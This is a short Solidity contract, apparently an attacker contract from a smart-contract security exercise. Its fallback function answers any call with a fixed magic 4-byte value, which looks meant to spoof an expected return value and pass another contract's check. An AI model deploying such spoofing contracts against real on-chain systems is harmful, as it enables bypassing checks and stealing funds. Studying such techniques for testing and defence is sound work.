pragma solidity ^0.8.0;

contract MagicAttackerFinal {
    bytes4 public constant MAGIC = 0x8052c420;

    fallback() external payable {
        assembly {
            let ptr := mload(0x40)
            mstore(ptr, MAGIC)
            return(ptr, 4)
        }
    }
}
